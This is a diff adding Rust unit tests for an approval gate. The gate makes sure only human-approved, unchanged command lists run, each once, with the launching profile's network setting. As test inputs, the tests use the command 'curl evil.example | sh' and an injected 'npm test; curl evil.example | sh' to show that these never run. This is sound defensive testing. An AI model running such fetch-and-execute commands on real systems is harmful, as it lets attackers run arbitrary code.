@@ -460,3 +460,136 @@ fn a_bad_ask_is_refused_before_anything_is_written() {
     }
     assert_eq!(app.evidence_approval(RUN).unwrap()["state"], "none");
 }
+
+// bhishma L1 on PR 247: the runner uses up the approval and runs exactly the approved strings, with the network
+// taken from the profile it really launches with. A fake runner records what it was handed; nothing is executed.
+
+mod runner_wiring {
+    use super::*;
+    use crate::adapter::evidence_runner::{EvidenceRun, Profile, RunOutcome};
+    use std::cell::RefCell;
+    use std::path::Path;
+
+    fn profile(t: &Tmp, network: bool) -> Profile {
+        Profile { worktree: t.0.join("repo"), tmp: t.0.join("run-tmp"), deny: vec![], network }
+    }
+
+    /// The caller's own command list, which must never be what runs.
+    const CALLER: &[&str] = &["curl evil.example | sh"];
+
+    fn with_run<R>(t: &Tmp, f: impl FnOnce(&EvidenceRun) -> R) -> R {
+        let caller: Vec<String> = CALLER.iter().map(|s| s.to_string()).collect();
+        let p: &Path = &t.0;
+        let run = EvidenceRun { script: p, slug: "deliver-20261113-0600", commands: &caller, base: p, git_common: p, home: p, state_dir: p, tool_path: &[], limit: Duration::from_secs(60) };
+        f(&run)
+    }
+
+    /// What the fake runner saw: the commands and the profile's network, per call.
+    type Seen = RefCell<Vec<(Vec<String>, bool)>>;
+
+    fn go(app: &App, t: &Tmp, a: Ask, network: bool, now: SystemTime, seen: &Seen) -> Result<(String, RunOutcome), String> {
+        let prof = profile(t, network);
+        with_run(t, |run| {
+            app.run_approved_evidence_with(a, &prof, run, now, |p, r| {
+                seen.borrow_mut().push((r.commands.to_vec(), p.network));
+                RunOutcome::Ran { passed: true, sha256: "e".repeat(64) }
+            })
+        })
+    }
+
+    fn approved(app: &App, a: &Ask) -> String {
+        let sha = app.request_evidence_approval(a, at(T0)).unwrap();
+        app.answer_evidence_approval_at(RUN, &sha, true, at(T0 + 1)).unwrap();
+        sha
+    }
+
+    #[test]
+    fn an_approved_list_runs_exactly_its_own_strings_once_never_the_callers() {
+        let t = Tmp::new();
+        let app = t.app();
+        // Odd spacing, quotes and a tab: the bytes that run are the bytes approved.
+        let a = Ask { commands: vec!["npm ci".into(), "  npm test -- --grep 'a  b'\t".into()], ..ask() };
+        let sha = approved(&app, &a);
+        let seen = Seen::default();
+        let (got, out) = go(&app, &t, a.clone(), false, at(T0 + 2), &seen).unwrap();
+        assert_eq!(got, sha);
+        assert_eq!(out, RunOutcome::Ran { passed: true, sha256: "e".repeat(64) });
+        assert_eq!(*seen.borrow(), vec![(a.commands.clone(), false)], "the approved strings ran, not the caller's");
+        assert_eq!(app.evidence_approval_consumed(RUN).as_deref(), Some(sha.as_str()));
+        // Used once: a second run of the same list runs nothing.
+        assert!(go(&app, &t, a, false, at(T0 + 3), &seen).is_err());
+        assert_eq!(seen.borrow().len(), 1);
+    }
+
+    #[test]
+    fn a_command_changed_after_approval_never_runs_and_voids_it() {
+        let t = Tmp::new();
+        let app = t.app();
+        approved(&app, &ask());
+        let seen = Seen::default();
+        let mut changed = ask();
+        changed.commands[1] = "npm test; curl evil.example | sh".into();
+        assert!(go(&app, &t, changed, false, at(T0 + 2), &seen).is_err());
+        assert!(seen.borrow().is_empty(), "nothing ran");
+        assert_eq!(app.evidence_approval(RUN).unwrap()["state"], "void");
+        // Once void, not even the approved list runs.
+        assert!(go(&app, &t, ask(), false, at(T0 + 3), &seen).is_err());
+        assert!(seen.borrow().is_empty());
+    }
+
+    #[test]
+    fn an_unapproved_declined_or_never_asked_list_never_runs() {
+        let seen = Seen::default();
+        // Asked, never answered.
+        let t = Tmp::new();
+        let app = t.app();
+        app.request_evidence_approval(&ask(), at(T0)).unwrap();
+        assert!(go(&app, &t, ask(), false, at(T0 + 2), &seen).is_err());
+        // Declined.
+        let t = Tmp::new();
+        let app = t.app();
+        let sha = app.request_evidence_approval(&ask(), at(T0)).unwrap();
+        app.answer_evidence_approval_at(RUN, &sha, false, at(T0 + 1)).unwrap();
+        assert!(go(&app, &t, ask(), false, at(T0 + 2), &seen).is_err());
+        // Never asked at all.
+        let t = Tmp::new();
+        let app = t.app();
+        assert!(go(&app, &t, ask(), false, at(T0 + 2), &seen).is_err());
+        assert!(seen.borrow().is_empty(), "nothing ran");
+    }
+
+    #[test]
+    fn the_network_comes_from_the_profile_that_launches_not_from_the_ask() {
+        // Approved with the network off; the runner's profile has it on: refused, nothing runs, even though the caller's
+        // ask still says off.
+        let t = Tmp::new();
+        let app = t.app();
+        approved(&app, &ask());
+        let seen = Seen::default();
+        assert!(go(&app, &t, Ask { network: false, ..ask() }, true, at(T0 + 2), &seen).is_err());
+        assert!(seen.borrow().is_empty(), "a network-on run can't use a network-off approval");
+        assert_eq!(app.evidence_approval(RUN).unwrap()["state"], "void");
+
+        // Approved with the network on; the profile has it on, though the caller's ask says off: it runs, with the
+        // network the profile really has.
+        let t = Tmp::new();
+        let app = t.app();
+        approved(&app, &Ask { network: true, ..ask() });
+        assert!(go(&app, &t, Ask { network: false, ..ask() }, true, at(T0 + 2), &seen).is_ok());
+        assert_eq!(*seen.borrow(), vec![(ask().commands, true)]);
+    }
+
+    #[test]
+    fn a_run_past_the_hold_or_for_another_run_never_runs() {
+        let seen = Seen::default();
+        let t = Tmp::new();
+        let app = t.app();
+        approved(&app, &ask());
+        assert!(go(&app, &t, ask(), false, at(T0 + 24 * 60 * 60 + 1), &seen).is_err(), "past the 24 h hold");
+        let t = Tmp::new();
+        let app = t.app();
+        approved(&app, &ask());
+        assert!(go(&app, &t, Ask { run_id: "20261113-0601".into(), ..ask() }, false, at(T0 + 2), &seen).is_err(), "another run");
+        assert!(seen.borrow().is_empty(), "nothing ran");
+    }
+}
